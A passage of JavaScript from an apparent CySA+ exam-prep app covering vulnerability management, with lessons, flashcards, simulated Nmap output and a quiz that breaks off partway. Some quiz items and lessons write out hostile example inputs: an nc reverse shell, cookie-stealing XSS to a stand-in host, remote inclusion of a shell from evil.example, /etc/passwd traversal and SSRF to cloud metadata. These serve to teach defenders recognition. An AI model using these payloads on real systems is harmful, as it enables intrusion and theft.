/* ================= Module 2: Vulnerability Management (CS0-004 Domain 2.0, 26%) ================= */
(function(){
/* ---- scanner export used by the terminal lab ---- */
const SCAN=(()=>{
  const H={"10.0.1.10":"vpn-gw (internet-facing)","10.0.1.20":"web-shop (internet-facing)","10.0.2.15":"dc01 (domain controller)","10.0.2.30":"files01 (file server)","10.0.3.44":"hr-db (PII database)","10.0.5.12":"lab-old (isolated lab)","10.0.4.88":"printer-3f"};
  const F=[["10.0.1.10",443,"Critical",9.8,"CVE-2024-3400 VPN gateway command injection","Yes (KEV)"],["10.0.1.20",443,"High",7.5,"TLS 1.0 and 1.1 enabled","No"],["10.0.1.20",443,"Medium",5.3,"Missing HTTP security headers","No"],["10.0.1.20",22,"Medium",5.3,"SSH weak MAC algorithms","No"],["10.0.2.15",445,"High",8.1,"SMB signing not required","No"],["10.0.2.15",3389,"Medium",6.5,"RDP NLA not enforced","No"],["10.0.2.30",445,"Critical",9.8,"SMBv1 enabled (MS17-010 EternalBlue)","Yes (KEV)"],["10.0.2.30",445,"High",8.1,"SMB signing not required","No"],["10.0.3.44",1433,"High",8.8,"SQL Server 2014 end of support","No"],["10.0.3.44",1433,"Medium",5.9,"Weak TLS cipher suites","No"],["10.0.5.12",445,"Critical",9.8,"SMBv1 enabled (MS17-010 EternalBlue)","Yes (KEV)"],["10.0.5.12",21,"High",7.5,"Anonymous FTP login allowed","No"],["10.0.4.88",23,"High",7.5,"Telnet service enabled","No"],["10.0.4.88",80,"Low",3.1,"Default web page disclosure","No"],["10.0.2.15",443,"Low",2.6,"Self-signed certificate","No"],["10.0.1.20",80,"Medium",4.3,"HTTP TRACE method enabled","No"]];
  const csv="host,port,severity,cvss,finding,exploited\n"+F.map(f=>f.join(",")).join("\n")+"\n";
  const assets="host,name,exposure,owner\n"+Object.entries(H).map(([h,n])=>{const [nm,ex="internal"]=n.split(" (");return `${h},${nm},${ex.replace(")","")},${nm.includes("hr")?"HR":"IT"}`}).join("\n")+"\n";
  return {csv,assets,crit:F.filter(f=>f[2]==="Critical").length};
})();
const NMAP={
  "-sn 10.0.4.0/24":"Nmap scan report for 10.0.4.1\nHost is up (0.0010s latency).\nNmap scan report for 10.0.4.22\nHost is up (0.0021s latency).\nNmap scan report for 10.0.4.88\nHost is up (0.0040s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 2.31 seconds",
  "-sV 10.0.4.88":"PORT   STATE SERVICE VERSION\n23/tcp open  telnet  HP JetDirect telnetd\n80/tcp open  http    HP-ChaiSOE 1.0\n9100/tcp open jetdirect?\nService Info: Device: printer",
  "-sV -p 21,22,80 10.0.5.12":"PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1\n80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)",
  "-O 10.0.5.12":"Running: Linux 2.6.X\nOS details: Linux 2.6.9 - 2.6.33\nNetwork Distance: 2 hops",
  "--script smb-protocols -p445 10.0.2.30":"PORT    STATE SERVICE\n445/tcp open  microsoft-ds\nHost script results:\n| smb-protocols:\n|   dialects:\n|     NT LM 0.12 (SMBv1) [dangerous, but default]\n|     2.0.2\n|_    3.1.1"
};

const LESSONS=[
{id:"scan",num:"2.1",title:"Vulnerability scanning methods and concepts",html:`
<p>Vulnerability management is a cycle: <b>discover assets</b>, <b>scan</b>, <b>analyze</b>, <b>prioritize</b>, <b>remediate</b>, <b>verify</b>, and <b>report</b>. You can't scan what you don't know exists, so it starts with <b>asset discovery</b>: map scans and <b>device fingerprinting</b> to build an inventory.</p>
<h3>Ways to scan</h3>
<ul><li><b>Internal vs external</b>: from inside the network (what an insider or malware sees) or from the internet (what an attacker sees first).</li>
<li><b>Agent vs agentless</b>: an agent on each host reports even when the laptop is off the network; agentless scans from the network with no install.</li>
<li><b>Credentialed vs non-credentialed</b>: logging in sees missing patches and local settings; non-credentialed sees only exposed services and has more false positives.</li>
<li><b>Passive vs active</b>: passive watches traffic (safe for fragile systems); active sends probes.</li>
<li><b>Static vs dynamic</b>: static analysis reads code or binaries without running them (including <b>reverse engineering</b>); dynamic tests the running app, including <b>fuzzing</b> (throwing malformed input at it).</li></ul>
<h3>Special considerations</h3>
<ul><li><b>Scheduling</b> and <b>operations</b>: scan in maintenance windows so you don't slow production.</li>
<li><b>Performance</b>: scans consume bandwidth and CPU.</li>
<li><b>Sensitivity levels</b>: how aggressive the checks are. Some checks can crash services.</li>
<li><b>Segmentation</b>: you need a scanner in, or a path into, every segment.</li>
<li><b>Regulatory requirements</b>: PCI DSS requires quarterly internal and external scans (external by an Approved Scanning Vendor) and after significant changes.</li></ul>
<h3>Critical infrastructure</h3>
<p><b>OT</b>, <b>ICS</b> and <b>SCADA</b> systems run physical processes and can crash or misbehave under active scanning. Prefer <b>passive</b> monitoring, vendor-approved tools, and careful scheduling with the plant operators.</p>
<h3>Baselines and frameworks</h3>
<p><b>Security baseline scanning</b> checks configurations against a standard. Frameworks to know: <b>PCI DSS</b>, <b>CIS Benchmarks</b>, <b>OWASP</b> and <b>ISO 27000</b>.</p>
<div class="viz" id="viz-scantype"></div>
<div class="viz" id="viz-scanq"></div>`},
{id:"tools",num:"2.2",title:"Analyzing output from assessment tools",html:`
<ul><li><b>Network scanning and mapping</b>: <b>Nmap</b> (ports, services, versions, OS), <b>Angry IP Scanner</b>, and <b>Maltego</b> (maps relationships between domains, people and infrastructure from OSINT).</li>
<li><b>Web application scanners</b>: <b>Burp Suite</b> (intercepting proxy), <b>OWASP ZAP</b>, <b>Arachni</b> and <b>Nikto</b> (web server misconfigurations).</li>
<li><b>Vulnerability scanners</b>: <b>Nessus</b> and <b>OpenVAS</b>. Output lists each finding with severity, CVSS, CVE, affected host and a fix.</li>
<li><b>Debuggers</b>: <b>GDB</b> and <b>Immunity Debugger</b>, for stepping through code during reverse engineering and exploit development.</li>
<li><b>Multipurpose</b>: <b>Nmap</b>, <b>Metasploit</b> (exploitation framework, used to validate a finding is real) and <b>Recon-ng</b> (OSINT reconnaissance).</li>
<li><b>Cloud infrastructure assessment</b>: <b>Scout Suite</b> and <b>Prowler</b> (audit cloud configurations), <b>Pacu</b> (AWS exploitation framework).</li></ul>
<h3>Reading Nmap</h3>
<p><span class="mono">-sn</span> ping sweep (host discovery), <span class="mono">-sS</span> SYN (half-open) scan, <span class="mono">-sV</span> service versions, <span class="mono">-O</span> OS detection, <span class="mono">-p</span> ports, <span class="mono">-A</span> aggressive (OS, versions, scripts, traceroute), <span class="mono">--script</span> NSE scripts. Port states: <b>open</b>, <b>closed</b> (reachable, nothing listening) and <b>filtered</b> (a firewall dropped the probe).</p>
<div class="viz" id="viz-scanterm"></div>
<div class="viz" id="viz-toolsort"></div>`},
{id:"web",num:"2.3",title:"Web and application vulnerabilities",html:`
<ul><li><b>Injection flaws</b>: untrusted input becomes part of a command. <b>SQL injection</b> (<span class="mono">' OR 1=1--</span>), <b>command injection</b> (<span class="mono">; cat /etc/passwd</span>), LDAP and XML injection.</li>
<li><b>Cross-site scripting (XSS)</b>: script injected into pages other users load. <b>Reflected</b> (in the request, bounced back once), <b>persistent / stored</b> (saved in the database, hits every visitor) and DOM-based.</li>
<li><b>Cross-site request forgery (CSRF)</b>: a malicious page makes a logged-in user's browser send a request they didn't intend. Fix: anti-CSRF tokens and SameSite cookies.</li>
<li><b>Server-side request forgery (SSRF)</b>: the server is tricked into fetching a URL the attacker chooses, often <span class="mono">http://169.254.169.254/</span> (cloud metadata) to steal credentials.</li>
<li><b>Directory traversal</b>: <span class="mono">../../etc/passwd</span> to read files outside the web root.</li>
<li><b>Local and remote file inclusion (LFI / RFI)</b>: the app includes a file the attacker chose, a local file or one hosted remotely.</li>
<li><b>Remote code execution (RCE)</b>: the attacker runs their own code on the server. The worst outcome.</li>
<li><b>Overflow vulnerabilities</b>: <b>buffer</b> (stack or heap) and <b>integer</b> overflows corrupt memory. Fix with bounds checking, memory-safe languages, ASLR and DEP.</li>
<li><b>Data poisoning</b>: feeding bad data into a system (or an ML model) so it makes wrong decisions.</li></ul>
<div class="viz" id="viz-weblog"></div>`},
{id:"sys",num:"2.4",title:"Design, configuration and component weaknesses",html:`
<ul><li><b>Broken access control</b>: users reach data or functions they shouldn't, like changing <span class="mono">?id=1001</span> to <span class="mono">?id=1002</span> (an insecure direct object reference).</li>
<li><b>Cryptographic failures</b>: sensitive data unencrypted, weak algorithms (MD5, DES, RC4), hard-coded keys.</li>
<li><b>Insecure design</b>: a flaw in the logic itself, such as a password reset that trusts the user-supplied email.</li>
<li><b>Security misconfiguration</b>: default credentials, directory listing, verbose errors, open cloud storage buckets.</li>
<li><b>End-of-life or outdated components</b>: software that no longer gets patches, or old libraries with known CVEs. A <b>software bill of materials (SBOM)</b> tells you what you run.</li>
<li><b>Identification and authentication failures</b>: no MFA, weak password rules, sessions that never expire, credential stuffing allowed.</li>
<li><b>Privilege escalation</b>: <b>vertical</b> (user to admin) or <b>horizontal</b> (one user to another user's data).</li></ul>
<p>These map closely to the <b>OWASP Top 10</b>, which the exam treats as the standard list of web risks.</p>
<div class="viz" id="viz-owasp"></div>`},
{id:"prio",num:"2.5",title:"Prioritizing vulnerabilities: CVSS and context",html:`
<h3>CVSS</h3>
<p>The <b>Common Vulnerability Scoring System</b> rates severity from 0 to 10. The base metrics: <b>attack vector</b> (network, adjacent, local, physical), <b>attack complexity</b>, <b>privileges required</b>, <b>user interaction</b>, <b>scope</b> (does it break out of the vulnerable component?), and impact on <b>confidentiality</b>, <b>integrity</b> and <b>availability</b>. Ratings: 0.1–3.9 low, 4.0–6.9 medium, 7.0–8.9 high, 9.0–10 critical.</p>
<p><b>CVSS v4.0</b> (2023) renames some metrics, adds <b>attack requirements</b>, and splits impact into the vulnerable system and subsequent systems. Exam questions still mostly show v3.1 vector strings like <span class="mono">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span> (9.8).</p>
<div class="viz" id="viz-cvss"></div>
<h3>Validation</h3>
<ul><li><b>True positive</b>: reported and real. <b>False positive</b>: reported, not real. <b>True negative</b>: nothing reported, nothing there. <b>False negative</b>: real, but missed (the dangerous one).</li></ul>
<div class="viz" id="viz-fpfn"></div>
<h3>Context beats raw scores</h3>
<ul><li><b>Context awareness</b>: is the asset <b>internal</b>, <b>external</b> or <b>isolated</b>?</li>
<li><b>Exploitability and weaponization</b>: is there public exploit code, or attacks in the wild? CISA's <b>Known Exploited Vulnerabilities (KEV)</b> catalog and <b>EPSS</b> (the probability it gets exploited in the next 30 days) help.</li>
<li><b>Asset value</b>: a flaw on the payment database matters more than one on a test VM.</li>
<li><b>Zero-day</b>: no patch exists yet, so you rely on compensating controls and monitoring.</li></ul>
<div class="viz" id="viz-context"></div>`},
{id:"mitigate",num:"2.6",title:"Mitigating vulnerabilities: secure coding and the SDLC",html:`
<h3>Secure coding best practices</h3>
<ul><li><b>Input validation</b>: allow-list what's expected, on the server side.</li>
<li><b>Output encoding</b>: encode data for the context it's displayed in (HTML, JavaScript, URL) to stop XSS.</li>
<li><b>Parameterized queries</b> (prepared statements): stop SQL injection by keeping code and data separate.</li>
<li><b>Session management</b>: random session IDs, Secure / HttpOnly / SameSite cookies, timeouts, new ID after login.</li>
<li><b>Authentication</b>: MFA, strong hashing (bcrypt, Argon2), lockouts and rate limits.</li>
<li><b>Data protection</b>: encrypt in transit and at rest, don't log secrets.</li></ul>
<h3>Secure software development life cycle (SDLC)</h3>
<p>Build security into every phase: requirements, <b>threat modeling</b> during design (for example STRIDE), secure coding, code review and <b>SAST</b>, testing with <b>DAST</b> and fuzzing, and monitoring after release. Fixing a flaw in design costs far less than fixing it in production.</p>
<div class="viz" id="viz-codefix"></div>`},
{id:"controls",num:"2.7",title:"Controls, patching and risk management",html:`
<h3>Control types</h3>
<p>Controls are sorted two ways. By <b>category</b>: <b>managerial</b> (also called administrative: policies, risk assessments), <b>operational</b> (people doing things: guards, training, change reviews), <b>technical</b> (firewalls, encryption, MFA) and <b>physical</b> (locks, fences). By <b>function</b>: <b>preventive</b>, <b>detective</b>, <b>deterrent</b>, <b>corrective</b>, <b>responsive</b> and <b>compensating</b> (an alternative when the main control isn't possible).</p>
<div class="viz" id="viz-ctlcat"></div>
<h3>Patching and configuration management</h3>
<p><b>Testing</b> (in a lab or with a pilot group), <b>implementation</b> during a <b>maintenance window</b>, a <b>rollback</b> plan, and <b>validation</b> (rescan to confirm). Changes go through change management. When a fix can't be applied, document an <b>exception</b> with an owner, compensating controls and an expiry date.</p>
<div class="viz" id="viz-patch"></div>
<h3>Risk management principles</h3>
<ul><li><b>Accept</b>: the risk is within appetite; document and sign off.</li>
<li><b>Transfer</b>: shift the financial impact, usually with insurance or a contract.</li>
<li><b>Avoid</b>: stop doing the risky thing (retire the system).</li>
<li><b>Mitigate</b>: reduce likelihood or impact with controls.</li></ul>
<p><b>Policies, governance and service-level objectives</b> set how fast each severity must be fixed, such as critical within 15 days and high within 30.</p>
<div class="viz" id="viz-risk"></div>`},
{id:"asm",num:"2.8",title:"Attack surface management and testing",html:`
<p>Your <b>attack surface</b> is everything an attacker can reach: internet-facing hosts, cloud services, APIs, exposed credentials, even employees on social media.</p>
<ul><li><b>Edge discovery</b>: find internet-facing assets, including forgotten ones (an old marketing site, a test VM with a public IP).</li>
<li><b>Passive discovery</b>: certificate transparency logs, DNS records and search engines like Shodan, without touching the target.</li>
<li><b>Security controls testing</b>: confirm the controls you think exist actually work.</li>
<li><b>Penetration testing</b> and <b>adversary emulation</b>: authorized attackers try to break in, sometimes copying a specific threat actor's TTPs. Needs written <b>rules of engagement</b> and scope.</li>
<li><b>Bug bounty</b>: pay outside researchers for responsibly disclosed flaws.</li>
<li><b>Attack surface reduction</b>: close unneeded ports, decommission old systems, remove public exposure.</li></ul>
<div class="viz" id="viz-asm"></div>`}
];

const G={
 scan:[["Vulnerability management cycle","Discover, scan, analyze, prioritize, remediate, verify, report"],["Asset discovery","Map scans and fingerprinting to build the inventory"],["Device fingerprinting","Identifying OS and device type from responses"],["Credentialed scan","Logs in; sees patches and local config; fewer false positives"],["Non-credentialed scan","Outside view of exposed services only"],["Agent-based scanning","Software on each host; works off-network"],["Agentless scanning","Network-based; nothing to install"],["Internal scan","From inside the network"],["External scan","From the internet; attacker's first view"],["Passive scanning","Watches traffic without sending probes"],["Active scanning","Sends probes to targets"],["Static analysis","Examines code or binaries without running them"],["Dynamic analysis","Tests the running application"],["Fuzzing","Sending malformed or random input to find crashes"],["Reverse engineering","Analyzing a binary to understand how it works"],["Scan sensitivity level","How aggressive the checks are"],["Why schedule scans?","Avoid hurting production performance"],["PCI DSS scanning","Quarterly internal and external (ASV) scans, plus after major changes"],["ASV","Approved Scanning Vendor for PCI external scans"],["ICS/SCADA scanning","Prefer passive; active probes can crash controllers"],["OT","Operational technology: systems running physical processes"],["Security baseline scan","Checks configuration against a standard"],["CIS Benchmarks","Consensus secure configuration guides"],["ISO 27000","International information security management standards"],["OWASP","Open Worldwide Application Security Project"]],
 tools:[["Nmap -sn","Ping sweep / host discovery"],["Nmap -sS","SYN (half-open) scan"],["Nmap -sV","Service and version detection"],["Nmap -O","OS detection"],["Nmap -A","Aggressive: OS, versions, scripts, traceroute"],["Nmap --script","Run NSE scripts"],["Port state: filtered","Firewall dropped the probe"],["Port state: closed","Reachable but nothing listening"],["Angry IP Scanner","Fast IP and port scanner"],["Maltego","OSINT relationship mapping"],["Burp Suite","Intercepting web proxy and scanner"],["OWASP ZAP","Open-source web app scanner and proxy"],["Arachni","Web application vulnerability scanner"],["Nikto","Web server misconfiguration scanner"],["Nessus","Commercial vulnerability scanner"],["OpenVAS","Open-source vulnerability scanner"],["GDB","GNU debugger"],["Immunity Debugger","Windows debugger for exploit development"],["Metasploit","Exploitation framework; validates findings"],["Recon-ng","OSINT reconnaissance framework"],["Scout Suite","Multi-cloud configuration auditing"],["Prowler","AWS/Azure/GCP security best-practice checks"],["Pacu","AWS exploitation framework"],["Shodan","Search engine for internet-exposed devices"]],
 vulns:[["SQL injection","Input changes a database query; fix with parameterized queries"],["' OR 1=1--","Classic SQLi tautology"],["Command injection","Input runs OS commands on the server"],["Reflected XSS","Script in the request is echoed back once"],["Stored XSS","Script saved on the server and served to every visitor"],["DOM-based XSS","Client-side script writes untrusted data into the page"],["XSS fix","Output encoding plus input validation and CSP"],["CSRF","Forces a logged-in browser to send an unwanted request"],["CSRF fix","Anti-CSRF tokens and SameSite cookies"],["SSRF","Server fetches an attacker-chosen URL"],["169.254.169.254","Cloud instance metadata address targeted by SSRF"],["Directory traversal","../ sequences to read files outside the web root"],["LFI","Local file inclusion"],["RFI","Remote file inclusion"],["RCE","Remote code execution"],["Buffer overflow","Writing past a buffer, corrupting memory"],["Integer overflow","A number wraps past its maximum"],["ASLR","Randomizes memory layout to hinder exploits"],["DEP","Marks memory non-executable"],["Data poisoning","Bad data inserted to corrupt decisions or models"],["Broken access control","Users reach data or functions they shouldn't"],["IDOR","Insecure direct object reference: changing an ID to reach others' data"],["Cryptographic failure","Unencrypted data, weak algorithms or keys"],["Insecure design","A flaw in the logic, not the code"],["Security misconfiguration","Defaults, open buckets, verbose errors"],["EOL component","Software no longer receiving patches"],["SBOM","Software bill of materials"],["Vertical privilege escalation","User to admin"],["Horizontal privilege escalation","User to another user's data"]],
 prio:[["CVSS","Common Vulnerability Scoring System, 0-10"],["CVSS low","0.1-3.9"],["CVSS medium","4.0-6.9"],["CVSS high","7.0-8.9"],["CVSS critical","9.0-10.0"],["AV:N","Attack vector: network (remotely exploitable)"],["AV:P","Attack vector: physical access needed"],["PR:N","No privileges required"],["UI:R","User interaction required"],["S:C","Scope changed: impact beyond the vulnerable component"],["CVSS v4.0 addition","Attack requirements (AT) metric"],["True positive","Reported and real"],["False positive","Reported but not real"],["False negative","Real but not reported; the most dangerous"],["True negative","Nothing reported, nothing there"],["KEV","CISA Known Exploited Vulnerabilities catalog"],["EPSS","Probability a CVE is exploited in the next 30 days"],["Weaponization","Exploit code is available and usable"],["Zero-day","Vulnerability with no patch yet"],["Asset value in prioritization","More valuable assets get fixed first"],["Isolated asset","Unreachable systems drop in priority"],["Input validation","Allow-list expected input, server-side"],["Output encoding","Encode for the display context to stop XSS"],["Parameterized query","Keeps SQL code and data separate"],["Threat modeling","Identifying threats during design (e.g., STRIDE)"],["STRIDE","Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation"],["SAST","Static application security testing"],["DAST","Dynamic application security testing"]],
 ctl:[["Managerial control","Policies, risk assessments (also 'administrative')"],["Operational control","Procedures people carry out: guards, training"],["Technical control","Enforced by technology: firewalls, encryption"],["Physical control","Locks, fences, badges"],["Preventive control","Stops an incident before it happens"],["Detective control","Identifies an incident in progress or after"],["Deterrent control","Discourages an attacker"],["Corrective control","Fixes damage after an incident"],["Responsive control","Acts in response to an event"],["Compensating control","Alternative when the primary control isn't feasible"],["Patch testing","Lab or pilot group before broad rollout"],["Maintenance window","Agreed time for changes and reboots"],["Rollback plan","How to undo a change that breaks things"],["Patch validation","Rescan to confirm the fix worked"],["Vulnerability exception","Documented, owned, time-limited acceptance with compensating controls"],["Risk acceptance","Document and sign off on a risk within appetite"],["Risk transfer","Insurance or contract shifts financial impact"],["Risk avoidance","Stop the risky activity"],["Risk mitigation","Reduce likelihood or impact with controls"],["Remediation SLO","Target time to fix by severity"],["Attack surface","Everything an attacker can reach"],["Edge discovery","Finding internet-facing assets"],["Passive discovery","Recon without touching the target (CT logs, DNS)"],["Certificate transparency","Public logs of issued TLS certificates"],["Rules of engagement","Written scope and limits for a pen test"],["Adversary emulation","Testing by copying a real actor's TTPs"],["Bug bounty","Paying researchers for disclosed flaws"],["Attack surface reduction","Removing unneeded exposure"]]
};
const DECKS=[["scan","Scanning"],["tools","Assessment tools"],["vulns","Vulnerabilities"],["prio","Prioritizing and mitigating"],["ctl","Controls and risk"]];
const CARDS=[];DECKS.forEach(([k])=>G[k].forEach((c,i)=>CARDS.push({deck:k,id:k+i,q:c[0],a:c[1]})));

const QUIZ=[
 {q:"What should happen FIRST in a vulnerability management program?",o:["Asset discovery and inventory","Patching","Penetration testing","Writing the report"],a:0,e:"You can't scan or protect what you don't know exists."},
 {q:"Which scan type gives the MOST accurate list of missing patches on Windows servers?",o:["Credentialed scan","Non-credentialed scan","Passive scan","External scan"],a:0,e:"Logging in lets the scanner read installed software and patch levels."},
 {q:"Laptops are rarely on the corporate network. Which approach scans them MOST reliably?",o:["Agent-based scanning","Agentless network scanning","External scanning","Passive scanning"],a:0,e:"Agents report wherever the device is."},
 {q:"A plant manager worries a scan could crash PLCs. What's the BEST approach?",o:["Passive monitoring and vendor-approved tools in a planned window","Aggressive active scan during production","No assessment at all","External scan only"],a:0,e:"OT/ICS can fail under active probes."},
 {q:"PCI DSS requires external vulnerability scans to be performed by whom?",o:["An Approved Scanning Vendor","Any employee","The card brands","The acquiring bank's auditors only"],a:0,e:"External PCI scans must be done by an ASV, at least quarterly."},
 {q:"Which BEST describes a non-credentialed scan?",o:["What an unauthenticated attacker on the network can see","A scan run by an unlicensed tool","A scan of only Linux hosts","A scan that logs in as admin"],a:0,e:"No login, so only exposed services are tested."},
 {q:"A tester sends millions of malformed inputs to an app's file parser to find crashes. What is this?",o:["Fuzzing","Static analysis","Reverse engineering","Threat modeling"],a:0,e:"Fuzzing is a dynamic testing technique."},
 {q:"Reviewing source code for flaws without running it is:",o:["Static analysis","Dynamic analysis","Fuzzing","Penetration testing"],a:0,e:"Static = not executed."},
 {q:"Scans slow down the ERP system during business hours. What should change FIRST?",o:["Scan scheduling to a maintenance window","Turn scanning off","Buy a faster scanner","Scan only the ERP"],a:0,e:"Schedule around operations."},
 {q:"Which framework provides consensus hardening guides used for baseline scans?",o:["CIS Benchmarks","OWASP Top 10","STIX","MITRE ATT&CK"],a:0,e:"CIS Benchmarks define secure configurations."},
 {q:"Which Nmap option performs host discovery only, without port scanning?",o:["-sn","-sV","-O","-p-"],a:0,e:"-sn is a ping sweep."},
 {q:"Which Nmap option identifies service versions on open ports?",o:["-sV","-sn","-sU","-T5"],a:0,e:"-sV probes services for versions."},
 {q:"Nmap reports a port as 'filtered'. What does it mean?",o:["A firewall or filter dropped the probe","Nothing is listening","The service is vulnerable","The host is down"],a:0,e:"Filtered = no response because something blocked it."},
 {q:"Nmap shows 21/tcp open ftp vsftpd 2.3.4. Why is this notable?",o:["That version contains a known backdoor","FTP is always encrypted","Port 21 is SSH","It's the latest version"],a:0,e:"vsftpd 2.3.4 was famously backdoored."},
 {q:"Which tool is an intercepting proxy for manually testing web apps?",o:["Burp Suite","Nessus","Maltego","Prowler"],a:0,e:"Burp sits between browser and server."},
 {q:"Which tool primarily finds web SERVER misconfigurations and dangerous files?",o:["Nikto","GDB","Recon-ng","Pacu"],a:0,e:"Nikto scans web servers."},
 {q:"Which tool audits AWS accounts against security best practices?",o:["Prowler","Arachni","Immunity Debugger","Angry IP Scanner"],a:0,e:"Prowler (and Scout Suite) assess cloud configurations."},
 {q:"Which tool is an AWS exploitation framework used by testers?",o:["Pacu","Nikto","OpenVAS","Maltego"],a:0,e:"Pacu exploits AWS misconfigurations."},
 {q:"An analyst wants to confirm a scanner finding is actually exploitable. Which tool?",o:["Metasploit","WHOIS","Maltego","Angry IP Scanner"],a:0,e:"Exploitation frameworks validate findings (with authorization)."},
 {q:"Which tool maps relationships between domains, email addresses and people from OSINT?",o:["Maltego","Nessus","GDB","ZAP"],a:0,e:"Maltego is a link-analysis OSINT tool."},
 {q:"Which tools are vulnerability scanners?",o:["Nessus and OpenVAS","GDB and Immunity","Maltego and Recon-ng","Wireshark and tcpdump"],a:0,e:"Nessus and OpenVAS scan for known vulnerabilities."},
 {q:"A web log shows: GET /item.php?id=10%20UNION%20SELECT%20username,password%20FROM%20users. What attack?",o:["SQL injection","XSS","Directory traversal","CSRF"],a:0,e:"UNION SELECT pulls data from another table."},
 {q:"A web log shows: GET /search?q=&lt;script&gt;document.location='http://x/?c='+document.cookie&lt;/script&gt;. What attack?",o:["Reflected XSS stealing cookies","SQL injection through the q parameter","SSRF","LFI"],a:0,e:"Script in a parameter, reflected back to the victim."},
 {q:"A forum post containing a script runs in every visitor's browser. What type of XSS?",o:["Stored (persistent)","Reflected","DOM-based","Blind SQLi"],a:0,e:"It's saved on the server."},
 {q:"GET /download?file=../../../../etc/passwd indicates:",o:["Directory traversal","XSS","CSRF","Integer overflow"],a:0,e:"../ climbs out of the web root."},
 {q:"A request to /fetch?url=http://169.254.169.254/latest/meta-data/iam/ suggests:",o:["SSRF targeting cloud metadata credentials","Stored XSS that steals session cookies","CSRF against the metadata API","Brute force of IAM keys"],a:0,e:"SSRF makes the server call the metadata service."},
 {q:"A user visits a malicious page that silently submits a funds transfer to their bank, where they're logged in. What attack?",o:["CSRF","SSRF","Stored XSS","SQL injection"],a:0,e:"The browser sends the victim's cookies with the forged request."},
 {q:"Which BEST prevents CSRF?",o:["Anti-CSRF tokens and SameSite cookies","Input length limits","Disabling TLS","Parameterized queries"],a:0,e:"Tokens prove the request came from the real site."},
 {q:"A form field input of '; nc -e /bin/sh 203.0.113.5 4444' indicates:",o:["Command injection","XSS","Directory traversal","LDAP injection"],a:0,e:"A semicolon chains an OS command (a reverse shell)."},
 {q:"page.php?include=http://evil.example/shell.txt is an example of:",o:["Remote file inclusion","Local file inclusion","CSRF","SSRF"],a:0,e:"The app includes a remote file."},
 {q:"Changing /invoice?id=1001 to id=1002 shows another customer's invoice. What is this?",o:["Broken access control (IDOR)","SQL injection","XSS","Cryptographic failure"],a:0,e:"The server doesn't check that the user owns the object."},
 {q:"Passwords are stored as unsalted MD5 hashes. Which category?",o:["Cryptographic failures","Security misconfiguration","Injection","SSRF"],a:0,e:"Weak, fast, unsalted hashing."},
 {q:"An S3 bucket with customer files is readable by anyone. Which category?",o:["Security misconfiguration","Insecure design","Injection","Integer overflow"],a:0,e:"A settings mistake."},
 {q:"A password reset sends the link to whatever email address the user types, even if it's not on the account. Which category?",o:["Insecure design","Buffer overflow","XSS","Data poisoning"],a:0,e:"A logic flaw in how the feature was designed."},
 {q:"Which document lists every library and version in an application, helping find outdated components?",o:["SBOM","SLA","MOU","ROE"],a:0,e:"Software bill of materials."},
 {q:"A regular user changes a cookie from role=user to role=admin and gains admin rights. What is this?",o:["Vertical privilege escalation","Horizontal privilege escalation","Replay","Session fixation"],a:0,e:"User to admin is vertical."},
 {q:"Which protections make buffer overflow exploits harder?",o:["ASLR and DEP","SPF and DKIM","WAF and IDS only","NTP and DNSSEC"],a:0,e:"Randomized addresses and non-executable memory."},
 {q:"An attacker repeatedly submits false fraud reports to a retailer's ML model so it starts flagging legitimate customers. What is this?",o:["Data poisoning","Prompt injection","SQL injection","Overflow"],a:0,e:"Corrupting the data a system learns from."},
 {q:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H. What does AV:N mean?",o:["Exploitable remotely over the network","Requires physical access","No availability impact","No authentication"],a:0,e:"Attack vector: network."},
 {q:"A CVSS score of 7.4 is rated:",o:["High","Medium","Critical","Low"],a:0,e:"7.0-8.9 is high."},
 {q:"What does Scope: Changed (S:C) mean in CVSS?",o:["Exploiting it affects resources beyond the vulnerable component","The vendor changed the patch after release, so you must rescan everything","The scan scope changed","The CVE was updated"],a:0,e:"For example, a VM escape affecting the hypervisor."},
 {q:"Which metric was ADDED in CVSS v4.0?",o:["Attack requirements","Attack vector","User interaction","Privileges required"],a:0,e:"v4.0 adds Attack Requirements (AT)."},
 {q:"A scanner reports a missing patch, but the admin shows it was installed and the scanner misread the version. This is a:",o:["False positive","False negative","True positive","True negative"],a:0,e:"Reported but not real."},
 {q:"Which scan result is MOST dangerous?",o:["False negative","False positive","True negative","True positive"],a:0,e:"A real flaw nobody knows about."},
 {q:"Two findings are both CVSS 9.8. One is on an isolated lab server, the other on an internet-facing VPN appliance listed in CISA KEV. Which first?",o:["The VPN appliance","The lab server","Whichever is older","Both at the same time, always"],a:0,e:"Exposure plus active exploitation."},
 {q:"What does EPSS estimate?",o:["The probability a vulnerability will be exploited soon","The expected cost of a breach caused by the flaw","The CVSS base score","Patch download time"],a:0,e:"Exploit Prediction Scoring System."},
 {q:"What is the CISA KEV catalog?",o:["A list of vulnerabilities known to be exploited in the wild","A list of every CVE published, with its CVSS base score and vendor","A patch download site","A malware sandbox"],a:0,e:"Prioritize anything on KEV."},
 {q:"A vendor confirms a flaw being exploited but has no patch yet. What should the team do?",o:["Apply compensating controls and increase monitoring","Wait for the patch","Accept the risk without documentation","Uninstall the scanner"],a:0,e:"Zero-day: mitigate and watch."},
 {q:"Which factor raises a vulnerability's priority the MOST beyond its CVSS base score?",o:["Public exploit code and an internet-exposed, high-value asset","A long CVE description and a high number of references in the NVD entry","The scanner vendor","The finding's age only"],a:0,e:"Context: exploitability, exposure and asset value."},
 {q:"Which BEST prevents SQL injection?",o:["Parameterized queries","Output encoding","Client-side validation only","Hiding error messages"],a:0,e:"Prepared statements separate code from data."},
 {q:"Which BEST prevents stored XSS when displaying user comments?",o:["Context-aware output encoding","Parameterized queries","TLS","Rate limiting"],a:0,e:"Encode output for HTML context."},
 {q:"Why must input validation happen on the server?",o:["Client-side checks can be bypassed","Servers are faster","Browsers don't support validation","It's required by TLS"],a:0,e:"Attackers can send requests without the browser."},
 {q:"Which session management practice prevents session fixation?",o:["Issue a new session ID after login","Use the same ID forever","Put the ID in the URL","Disable cookies"],a:0,e:"Rotate the ID on authentication."},
 {q:"During which SDLC phase is threat modeling MOST valuable?",o:["Design","Deployment","Decommissioning","After a breach"],a:0,e:"Cheapest to fix flaws before code exists."},
